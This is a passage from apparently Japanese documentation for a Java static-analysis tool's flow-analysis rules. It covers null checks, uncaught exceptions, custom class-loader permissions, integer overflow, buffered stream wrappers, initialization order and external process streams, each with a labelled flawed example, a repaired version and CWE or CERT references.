PCI Data Security Standard 3.2
6.5.5 Improper error handling
<A target="_blank" HREF="https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf">https://www.pcisecuritystandards.org/documents/PCI_DSS_v3-2-1.pdf</A>

CWE-252: Unchecked Return Value
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/252.html">https://cwe.mitre.org/data/definitions/252.html</A>

Tags: PCI-DSS, CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.DEREF" href="#top">[Top]</a><br/><br/><STRONG>
null チェックの前に間接参照しない [BD.PB.DEREF]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

このルールは、null かどうかチェックされている参照が、チェックに到るまでの
パスで間接参照されている場合に、違反を検出します。

これらの null チェックは、リファクタリングの過程で不要になった
ものである可能性があります。あるいは、すでに null チェックがあるコードに
間接参照を追加した時、開発者が誤って間接参照を null チェックの前に
追加した可能性もあります。通常、そのような状況はコードの矛盾を
表しているため、コードが正しいかどうかを確認することが推奨されます。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>

間接参照と null チェックが同じメソッドにある場合は、たいていはロジックの問題
を意味しています。どちらかが別のメソッドにある場合は、レポートされた違反を
修正する前に、より注意深く確認する必要があります。なぜなら、null チェックを
削除することが明白な解決方法ですが、null チェックが将来の変更に対する防護策
である場合もあるからです。


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

このルールのパラメータライズを理解するには、まずルールの動作を
理解する必要があります。

このルールは、コードに存在する null チェックを検査し、チェックが
不要でないかを確認します。そのため、たとえば 変数 foo の null 
チェックを行っている場合、null チェックに到るすべてのコード パスを
検査し、パスで変数 foo が間接参照されているのを発見した場合に
違反をレポートします。

このため、すべてのメソッド呼び出しが現在のコードベースに存在すると
仮定した場合、フロー解析は積極的に違反をレポートします。一方、メソッドに
任意の値が渡される可能性があると仮定した場合、より少ない数の違反を
レポートしますが、レポートされた違反はより正確であると期待できます。

フロー解析では、以下のメソッドに任意の値が渡される可能性があると仮定する
よう設定できます。

   * なし (すべてのメソッド呼び出しが現在のコードベースに存在すると
           仮定する - 最大の積極性)
   * public 
   * public、protected  
   * public、protected、package-private
   * すべての可視性のメソッド (最小の積極性、最大の正確さ) [デフォルト値]

デフォルトのオプションでは、最小限の違反がレポートされ、誤検出の可能性は
非常に低いと期待できます。[public、protected、package-private] を選択しても
通常は良好な結果が得られます。異なるオプションを試行し、コード ベースに最も
適合するオプションを選択することを推奨します。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>
null 参照の可能性があるコードを検出し、到達しないコードを発見するのに役立ちます。


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.util.Collection;
import java.util.Iterator;

public class Example
{
    public void doStuff(Collection&lt;Integer&gt; collection)
    {
        Iterator&lt;Integer&gt; it = collection.iterator(); // 間接参照のポイント
        // perform some actions
        if (null != collection) { // 違反
            collection.notifyAll();
        }
    }
}

このサンプルでは、パラメーター c を使用して iterator() メソッドを呼び出しています。
後でそれを使用して NULL のチェックを行っています。



</PRE>
<STRONG>
修正
</STRONG>
<PRE>
コードを修正するには、c.iterator() の呼び出しが行われる時点で変数 c が null
参照を保持している可能性があるかどうかを判断する必要があります。
そのような可能性がない場合 (doStuff() を null パラメーターで呼び出すことが
ない場合)、違反がレポートされた不要な null チェックを削除します。
doStuff() メソッドに null 引数が渡される可能性がある場合は、コードを
修正して c.iterator() の呼び出しの後ではなく前に適切なアクションを伴った
null チェックが行われるようにする必要があります。

次のサンプルは、doStuff() に null が渡される可能性がある場合の修正例です。

import java.util.Collection;
import java.util.Iterator;
import java.util.Vector;

public class Repair
{
    public void doStuff(Collection&lt;Integer&gt; collection)
    {
        if (null == collection) {
            collection = new Vector&lt;Integer&gt;();
            // initialize collection
        }
        Iterator&lt;Integer&gt; it = collection.iterator();
        // perform some actions
        collection.notifyAll();
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-476: NULL Pointer Dereference
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/476.html">https://cwe.mitre.org/data/definitions/476.html</A>

CWE-561: Dead Code
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/561.html">https://cwe.mitre.org/data/definitions/561.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.EXCEPT" href="#top">[Top]</a><br/><br/><STRONG>
例外を常にキャッチする [BD.PB.EXCEPT]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、例外がスローされているがキャッチされていない場合に違反をレポート
します。デフォルトでは、main メソッドで例外をキャッチし損ねていないかをチェックします。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.1


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
例外は、情報漏えいにつながり、認可されていないユーザーに機密情報を提供する可能性があります。
例外は、サービス拒否攻撃を可能にする情報を公開する場合があります。たとえば、コンソールで実行
される Java プログラムがキャッチされない例外のために終了すると、例外メッセージとスタックトレースが
コンソールに表示され、それによってプログラムの内部構造に関する機密情報が公開される可能性があります。
そのため、すべての例外をキャッチし、例外の安全性を保障する方法で処理するべきです。



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[例外をスローしてはならないメソッド] パラメーターを使用すると、例外をスローしてはならない
メソッドを追加で指定できます。

以下はメソッド テーブルの列に関する説明です。

*[有効] 列を使用すると、定義済みのメソッドのフロー解析を一時的に無効にすることができます。

* [完全修飾型名 (ワイルドカード)] 列にはメソッドを宣言する型の完全修飾名を指定する必要があります。
任意の型 (または名前空間) で宣言されたメソッド、また型や名前空間の外で宣言されたグローバル メソッド
を指定するには '*' を使用します。

* [メソッド名 (ワイルドカード)] 列にはメソッドの名前を指定します。

* [+ サブクラスの定義] 列は、指定されたクラスのサブクラスで定義されている指定された名前のメソッド
に対してこの列の設定を適用するかどうかを指定します。この設定は、インスタンス メソッドおよび
非インスタンスメソッドの両方に適用されることに注意してください。

[アグレッシブ モード] を有効化すると、キャッチされていない例外のあるパスが、main メソッドや 
[例外をスローしてはならないメソッド] パラメーターで指定されたメソッドから開始されていない場合も
違反がレポートされます。フロー解析は、誤検出の可能性が高い場合でも、すべての問題の可能性に対して
違反をレポートします。この設定では、バグ検出数は増えますが、誤検出の数も増える可能性があります。

[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。




</PRE>
<STRONG>
利点
</STRONG>
<PRE>
このルールは、コードのバグを示唆する可能性があるキャッチされない例外を検出することで、コードの品質を
高く保つのに役立ちます。また、機密データの漏えいを防ぎ、適切な例外処理を保証するのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    public static void main(String[] args)
    {
        try {
            foo(args.length);
        } catch (ArithmeticException exc) {
            //...
        }
    }

    private static void foo(int n)
    {
        if (n &gt; 2) {
            throw new ArithmeticException();
        } else {
            throw new ArrayIndexOutOfBoundsException(); // 違反
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
すべての例外をキャッチするように "main" メソッドを変更します。

public class Repair
{
    public static void main(String[] args)
    {
        try {
            foo(args.length);
        } catch (RuntimeException exc) {
            //...
        }
    }

    private static void foo(int n)
    {
        if (n &gt; 2) {
            throw new ArithmeticException();
        } else {
            throw new ArrayIndexOutOfBoundsException(); // 違反ではない
        }
    }
}

教育とトレーニング

Exceptions
Video: <A target="_blank" HREF="https://vimeo.com/201696974">https://vimeo.com/201696974</A>
PDF: <A target="_blank" HREF="http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_4-Exceptions.pdf">http://research.cs.wisc.edu/mist/SoftwareSecurityCourse/Chapters/3_4-Exceptions.pdf</A>



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-476: NULL Pointer Dereference
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/476.html">https://cwe.mitre.org/data/definitions/476.html</A>

CWE-457: Use of Uninitialized Variable
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/457.html">https://cwe.mitre.org/data/definitions/457.html</A>

SEI CERT Oracle Coding Standard for Java
ERR01-J. Do not allow exceptions to expose sensitive information 
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/ERR01-J.+Do+not+allow+exceptions+to+expose+sensitive+information">https://www.securecoding.cert.org/confluence/display/java/ERR01-J.+Do+not+allow+exceptions+to+expose+sensitive+information</A>

Java Platform, Standard Edition (Java SE) 8, Class Exception
<A target="_blank" HREF="http://docs.oracle.com/javase/8/docs/api/java/lang/Exception.html">http://docs.oracle.com/javase/8/docs/api/java/lang/Exception.html</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.GETPERM" href="#top">[Top]</a><br/><br/><STRONG>
ユーザー定義のクラス ローダーが適用される場合、getPermission() メソッドの呼び出しが想定される [BD.PB.GETPERM]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明
このルールは、カスタム クラス ローダーが getPermissions() メソッドをオーバーライドしており、
返されるオブジェクトが、スーパークラスの getPermissions() メソッドの呼び出しによって作成されて
いない場合に違反をレポートします。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
カスタム クラス ローダーの定義でデフォルトのシステム ポリシーを調べないことは、防御的プログラミングの
方針に違反しており、クラスに意図しないパーミッションが定義される可能性につながります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
カスタム ポリシーに加えて、デフォルトのシステム レベルのセキュリティ ポリシーが確実に適用される
ことを保証します。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

import java.net.URL;
import java.net.URLClassLoader;
import java.security.CodeSource;
import java.security.PermissionCollection;
import java.security.Permissions;

public class Example
    extends URLClassLoader
{
    public Example(URL[] urls)
    {
        super(urls);
    }

    protected PermissionCollection getPermissions(CodeSource cs)
    {
        PermissionCollection pc = new Permissions();
        // いつでも VM を終了することを許可する
        pc.add(new RuntimePermission("exitVM"));
        return pc; // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

import java.net.URL;
import java.net.URLClassLoader;
import java.security.CodeSource;
import java.security.PermissionCollection;

public class Repair
    extends URLClassLoader
{
    public Repair(URL[] urls)
    {
        super(urls);
    }

    protected PermissionCollection getPermissions(CodeSource cs)
    {
        PermissionCollection pc = super.getPermissions(cs);
        // いつでも VM を終了することを許可する
        pc.add(new RuntimePermission("exitVM"));
        return pc; // 違反ではない
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
SEC07-J. Call the superclass's getPermissions() method when writing a custom class loader
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/SEC07-J.+Call+the+superclass's+getPermissions%28%29+method+when+writing+a+custom+class+loader">https://www.securecoding.cert.org/confluence/display/java/SEC07-J.+Call+the+superclass's+getPermissions%28%29+method+when+writing+a+custom+class+loader</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.INTOVERF" href="#top">[Top]</a><br/><br/><STRONG>
整数のオーバーフローを避ける [BD.PB.INTOVERF]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

「整数のオーバーフローまたはラップ アラウンドは、整数値が関連付けられた表現で格納
するには大きすぎる値にインクリメントされた場合に発生します。オーバーフローが
発生すると、値は非常に小さい値または負数にラップされる場合があります。」
[CWE-190]

整数値が関連付けられた表現で格納するには小さすぎる値にデクリメントされた場合にも
類似の問題が発生します。この場合、値は非常に大きい値にラップされる場合があります。

オーバーフローやアンダーフローを防ぐには、算術演算の結果が関連する表現に格納
可能な範囲内であることを確認し (表現可能な値の最大値を超えず、最小値を
下回らないこと)、またより小さい型にキャストしないようにします。

このルールは、整数の算術演算でオーバーフローが発生する場合、または整数値を
より狭い型にキャストしている場合に違反をレポートします。



</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>

v10.4.2



</PRE>
<STRONG>
注意
</STRONG>
<PRE>

N/A



</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>

「ラップが発生することを予期している状況では、このような処理が意図した振る舞い
である場合もありますが、ラップが予期しないものである場合は、重大な問題が発生する
可能性があります。ユーザーの入力を使用して整数オーバーフローが発生する場合は特に
重大です。結果をループ制御、セキュリティ上の決定、またはメモリ割り当て、コピー、
結合などのオフセットまたはサイズに使用している場合は、セキュリティクリティカルな
問題となります。」[CWE-190]

「この弱点は、バッファー オーバーフローを引き起こし、任意のコードを実行するために
利用される可能性があります。通常、このような状況は、プログラムの暗黙的な
セキュリティ ポリシーの範囲を逸脱しています。」[CWE-191]



</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>

[アグレッシブ モード] : true に設定すると、オペランドの型と同じかそれより大きい型に整数を
キャストした場合、またはキャストされる値が -1 である場合にオーバーフローが
発生したときにも違反をレポートします。



</PRE>
<STRONG>
例外
</STRONG>
<PRE>

デフォルトでは、オペランドの型と同じかそれより大きい型に整数をキャストした場合、または
キャストされる値が -1 である場合、オーバーフローが発生しても違反はレポートされません
(「パラメーター」を参照)。



</PRE>
<STRONG>
利点
</STRONG>
<PRE>

未定義の動作、メモリ破壊、セキュリティ攻撃などにつながる可能性がある意図しない
整数ラップアラウンドを防ぐのに役立ちます (「セキュリティとの関連」を参照)。



</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>

N/A



</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

次のサンプルでは、変数 'a' と 'b' の和が int 型として返されています。
返された値  (4000000000) が int 型の最大値 (2147483647) を超える
ため、整数オーバーフローが発生します。

public class Example
{
    int testArithmetic()
    {
        int a = 2000000000;
        int b = 2000000000;
        return a + b; // 違反
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>

'a' と 'b' の和を格納できる 'long' 型の変数を使用するよう変更します。

public class Repair
{
    long testArithmetic()
    {
        long a = 2000000000;
        long b = 2000000000;
        return a + b; // 違反ではない
    }
}

教育とトレーニング

2020 CWE Top 25 Most Dangerous Software Errors
CWE-20: Improper Input Validation
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/20.html">https://cwe.mitre.org/data/definitions/20.html</A>

2020 CWE Top 25 Most Dangerous Software Errors
CWE-190: Integer Overflow or Wraparound
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/190.html">https://cwe.mitre.org/data/definitions/190.html</A>

CWE-191: Integer Underflow (Wrap or Wraparound)
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/191.html">https://cwe.mitre.org/data/definitions/191.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.MULBUF" href="#top">[Top]</a><br/><br/><STRONG>
単一のバイト ストリームまたは文字ストリームに複数のバッファー付きラッパーを作成してはならない [BD.PB.MULBUF]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
「1 つの入力ストリームに複数のバッファー付きラッパーがあってはいけません。入力ストリームごとに
1 つのラッパーだけを作成して使用し、ラッパーを必要とするメソッドに引数として渡すか、クラスの変数として
宣言します。」[SEI CERT Oracle Coding Standard for Java; FIO06-J. Do not create multiple buffered 
wrappers on a single byte or character stream]

このルールは、InputStream 型のオブジェクトが複数のバッファー付きラッパーを作成するのに使用
されている場合に違反をレポートします。

以下のラッパー型は固有の InputStream 型のパラメーターを持つべきです。
  * java.io.BufferedInputStream
  * java.io.BufferedOutputStream
  * java.io.BufferedReader
  * java.io.BufferedWriter
  * java.util.Scanner
  

</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
10.4


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
「1 つの入力ストリームに関連して複数のラッパーを使用するプログラムは、ラッパーが先読みを許すかどうかに
よって予期しない動作をすることがあります。攻撃者はこの動作の違いを悪用して、たとえば  System.in (ファイルから)
をリダイレクトしたり、System.setIn() メソッドを使用して System.in をリダイレクトしたりできます。」
[SEI CERT Oracle Coding Standard for Java; FIO06-J. Do not create multiple buffered wrappers
on a single byte or character stream]


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
コードを悪意のある攻撃から保護するのに役立ちます。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    public static char getChar()
        throws EOFException, IOException
    {
        BufferedInputStream in = new BufferedInputStream(System.in); // 違反
        int input = in.read();
        if (input == -1) {
            throw new EOFException();
        }
        return (char)input;
    }

    public static void main(String[] args)
    {
        try {
            System.out.print("Enter first initial: ");
            char first = getChar();
            System.out.println("Your first initial is " + first);
            System.out.print("Enter last initial: ");
            char last = getChar();
            System.out.println("Your last initial is " + last);
        } catch (EOFException e) {
            System.err.println("ERROR");
        } catch (IOException e) {
            System.err.println("ERROR");
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
System.in に対して 1 つの BufferedInputStream だけを作成して使用します。

public class Repair
{
    private static BufferedInputStream in = new BufferedInputStream(System.in);

    public static char getChar()
        throws EOFException, IOException
    {
        int input = in.read();
        if (input == -1) {
            throw new EOFException();
        }
        in.skip(1);
        return (char)input;
    }

    public static void main(String[] args)
    {
        try {
            System.out.print("Enter first initial: ");
            char first = getChar();
            System.out.println("Your first initial is " + first);
            System.out.print("Enter last initial: ");
            char last = getChar();
            System.out.println("Your last initial is " + last);
        } catch (EOFException e) {
            System.err.println("ERROR");
        } catch (IOException e) {
            System.err.println("ERROR");
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
FIO06-J. Do not create multiple buffered wrappers on a single byte or character stream
<A target="_blank" HREF="https://wiki.sei.cmu.edu/confluence/display/java/FIO06-J.+Do+not+create+multiple+buffered+wrappers+on+a+single+byte+or+character+stream">https://wiki.sei.cmu.edu/confluence/display/java/FIO06-J.+Do+not+create+multiple+buffered+wrappers+on+a+single+byte+or+character+stream</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.NOTEXPLINIT" href="#top">[Top]</a><br/><br/><STRONG>
明示的に初期化する前の使用を避ける [BD.PB.NOTEXPLINIT]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、メンバー変数を明示的に初期化する前に使用している場合に違反をレポート
します。Java ではすべてのメンバー変数が暗黙的に初期化されますが、暗黙的な初期化
がバグの原因になる可能性もあります。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v8.0


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
[未検証の違反をレポートする] パラメーターをオンにすると、より多くの違反をレポート
できますが、誤検出の数も増える可能性があります。このパラメーターがオンの場合、
フロー解析は、違反に至るパスが関数の先頭から到達可能かどうかをチェックしません。
一部の複雑なケースでは、解析の深さの制限によって、フロー解析が違反の検証処理を
完了できない場合があります。その場合、このパラメーターがオンになっているときにだけ、
違反が検出されます。


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    void test()
    {
        SomeClass myObject = new SomeClass(5);
        myObject.compute();
    }

    class SomeClass
    {
        int _i, _j;

        SomeClass(int i)
        {
            _i = i * 2;
        }

        int compute()
        {
            return _i * _j; // 違反 (_j は初期化されていない)
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
次のコードでは、myObject の両方のフィールドがアクセスの時点で初期化されているため、
違反はレポートされません。

public class Repair
{
    void test()
    {
        SomeClass myObject = new SomeClass(5);
        myObject._j = 3;
        myObject.compute();
    }

    class SomeClass
    {
        int _i, _j;

        SomeClass(int i)
        {
            _i = i * 2;
        }

        int compute()
        {
            return _i * _j; // 違反ではない
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-457: Use of Uninitialized Variable
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/457.html">https://cwe.mitre.org/data/definitions/457.html</A>

CWE-665: Improper Initialization
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/665.html">https://cwe.mitre.org/data/definitions/665.html</A>



Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.NOTINITCTOR" href="#top">[Top]</a><br/><br/><STRONG>
コンストラクターおよび静的イニシャライザーで初期化する前にフィールドを使用しない [BD.PB.NOTINITCTOR]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、メンバー変数をコンストラクターや静的なイニシャライザーで明示的に初期化
する前に使用している場合に違反をレポートします。このような場合、アプリケーション
ロジックの重大な問題を表していることがよくあります。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
8.3


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    static class User
    {
        String name;

        String password;

        User(String name, String password)
        {
            this.name = name;
            this.password = password;
            checkData();
        }

        void checkData()
        {
            // empty implementation
        }
    }

    static class RestrictedUser
        extends User
    {
        int minLoginLength = 7;

        RestrictedUser(String name, String password)
        {
            super(name, password);
        }

        @Override
        void checkData()
        {
            // 基底クラスのコンストラクタから checkData() メソッドが呼び出されるとき、minLoginLength フィールドはまだ初期化されていない
            if (super.name.length() &lt; this.minLoginLength) { // 違反
                throw new IllegalArgumentException("length of name should be greater than 7");
            }
            // ..
        }
    }
}

User クラスのコンストラクターから呼び出される checkData メソッドでの minLoginLength フィールドの使用に
対して違反がレポートされます。この時点では、minLoginLength の値は 0 です。なぜなら、RestrictedUser
クラスのインスタンスが作成されるとき、minLoginLength フィールドはまずデフォルトの 0 で初期化され、
その後スーパー クラスのコンストラクターが呼び出された後に、初めてユーザー定義の 7 による初期化が
実行されるからです。


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
次のコードは、minLoginLength の初期化の後に checkData メソッドが呼び出されているため、
違反はレポートされません。

public class Repair
{
    static class User
    {
        String name;

        String password;

        User(String name, String password)
        {
            this.name = name;
            this.password = password;
        }

        void checkData()
        {
            // empty implementation
        }
    }

    static class RestrictedUser
        extends User
    {
        int minLoginLength = 7;

        RestrictedUser(String name, String password)
        {
            super(name, password);
            checkData();
        }

        @Override
        void checkData()
        {
            if (super.name.length() &lt; this.minLoginLength) { // 違反ではない
                throw new IllegalArgumentException("length of name should be greater than 7");
            }
            // ..
        }
    }
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-457: Use of Uninitialized Variable
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/457.html">https://cwe.mitre.org/data/definitions/457.html</A>

CWE-665: Improper Initialization
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/665.html">https://cwe.mitre.org/data/definitions/665.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.PBIOS" href="#top">[Top]</a><br/><br/><STRONG>
外部プロセスが入力および出力ストリームをブロックするのを防ぐ [BD.PB.PBIOS]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
﻿説明
このルールは、以下のいずれかの方法で新しいプロセスが作成され、
- java.lang.Runtime.exec(String command)
- java.lang.ProcessBuilder.start()
プロセスに読み取られていない入力ストリームまたはエラー ストリームがある
場合に違反をレポートします。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.2


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
プロセスは、入力ストリームに入力が送られることを要求する場合があり、また、エラー ストリームに出力を
生成する場合があります。そのような外部プログラムの処理が誤っていると、予期しない例外、サービス拒否
(DoS)、その他のセキュリティの問題を引き起こす可能性があります。


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
コードが安全でセキュアであることを確認します。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    public void example(String command)
        throws Exception
    {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(command);
        proc.waitFor();
    } // 違反
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
この修正例は、プロセスの出力ストリームおよびエラー ストリームを消費する 2 つのスレッド作成します。
そのため、プロセスが 2 つのストリームを無限にブロックすることはありません。

import java.io.IOException;
import java.io.InputStream;
import java.io.PrintStream;

public class Repair
{
    class StreamGobbler
        implements Runnable
    {
        private final InputStream is;

        private final PrintStream os;

        StreamGobbler(InputStream is, PrintStream os)
        {
            this.is = is;
            this.os = os;
        }

        public void run()
        {
            try {
                int c;
                while ((c = is.read()) != -1) {
                    os.print((char)c);
                }
            } catch (IOException x) {
                // Handle error
            }
        }
    }

    public void repair(String command)
        throws Exception
    {
        Runtime rt = Runtime.getRuntime();
        Process proc = rt.exec(command);
        Thread errorGobbler = new Thread(new StreamGobbler(proc.getErrorStream(), System.err));
        Thread outputGobbler = new Thread(new StreamGobbler(proc.getInputStream(), System.out));
        errorGobbler.start();
        outputGobbler.start();
        proc.waitFor();
        errorGobbler.join();
        outputGobbler.join();
    } // 違反ではない
}


</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

SEI CERT Oracle Coding Standard for Java
FIO07-J. Do not let external processes block on IO buffers
<A target="_blank" HREF="https://www.securecoding.cert.org/confluence/display/java/FIO07-J.+Do+not+let+external+processes+block+on+IO+buffers">https://www.securecoding.cert.org/confluence/display/java/FIO07-J.+Do+not+let+external+processes+block+on+IO+buffers</A>

Tags: CERT

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.POVR" href="#top">[Top]</a><br/><br/><STRONG>
使用前にメソッド パラメーターを上書きすることを避ける [BD.PB.POVR]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>
このルールは、メソッドのパラメーター値が既に存在しているパス上で、
パラメーターの値が使用される前に上書きされている場合に違反をレポートします。


</PRE>
<STRONG>
このルールが導入されたバージョン
</STRONG>
<PRE>
v10.0.7


</PRE>
<STRONG>
注意
</STRONG>
<PRE>
実際のメソッドの内部にあるパラメーターだけが解析されます。
ルールは、他のメソッドを呼び出すために使用されるパラメーターは正しく
使用されているものと仮定します。


</PRE>
<STRONG>
セキュリティとの関連
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
パラメーター
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
利点
</STRONG>
<PRE>
常に上書きされるパラメーターは、コードの品質が低いこと、またはプログラムに
バグがあることを示唆します。


</PRE>
<STRONG>
デメリット
</STRONG>
<PRE>
N/A


</PRE>
<STRONG>
サンプルコード
</STRONG>
<PRE>

public class Example
{
    class StackElement
    {
        public StackElement previous;

        public int value;

        public StackElement(StackElement previousElement, int value) // 違反
        {
            previous = previousElement;
            value = previousElement.value;
        }
    }
}


</PRE>
<STRONG>
修正
</STRONG>
<PRE>
上記のサンプルでは、不適切なフィールドによって不適切な値が初期化されています。

public class Repair
{
    public class StackElement
    {
        public StackElement previous;

        public int value;

        public StackElement(StackElement previousElement, int value) // 違反ではない
        {
            this.previous = previousElement;
            this.value = value;
        }
    }
}



</PRE>
<STRONG>
関連資料
</STRONG>
<PRE>

CWE-563: Assignment to Variable without Use
<A target="_blank" HREF="https://cwe.mitre.org/data/definitions/563.html">https://cwe.mitre.org/data/definitions/563.html</A>

Tags: CWE

</PRE><br/><hr/><br/><a class="notPrintable" id="BD.PB.STRNULL" href="#top">[Top]</a><br/><br/><STRONG>
文字列に null を付加しない [BD.PB.STRNULL]
</STRONG>
<p>
<BR><BR>
<STRONG>
説明
</STRONG>
<PRE>

いくつかの文字列を連結して、最終的にアプリケーションのユーザーに
表示される複雑な文字列を作成している場合、オペランドの 1 つが null で
あると、リテラル文字列の "null" が追加されます。

次の場合に違反がレポートされます。
- 文字列に null が付加されている場合
- 以下のメソッドに null 値が渡されている場合
(System.ArgumentNullException が throw される引数は除きます)

   * java.io.PrintStream.append
